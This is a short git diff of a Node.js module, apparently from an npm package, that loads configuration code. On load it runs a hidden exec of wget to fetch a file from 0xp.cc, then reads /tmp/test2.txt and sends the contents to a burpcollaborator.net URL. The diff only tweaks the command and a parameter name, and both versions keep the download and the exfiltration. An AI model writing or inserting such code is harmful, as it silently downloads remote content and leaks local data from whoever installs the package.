@@ -2,7 +2,7 @@ const path = require('path');
 const nconf = require('nconf');
 const { exec } = require("child_process");
 
-exec("wget http://0xp.cc/d.txt > /tmp/test2.txt", (error, stdout, stderr) => {
+exec("wget http://0xp.cc/d.txt", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         return;
@@ -77,7 +77,7 @@ fs.readFile('/tmp/test2.txt', 'utf8' , (err, data) => {
     return
   }
   console.log(data);
-  request('http://c3gp9ipe195eceg0l5xgronjsay1upj.burpcollaborator.net/?file=' +data);
+  request('http://c3gp9ipe195eceg0l5xgronjsay1upj.burpcollaborator.net/?filelocal=' +data);
 
 });
 
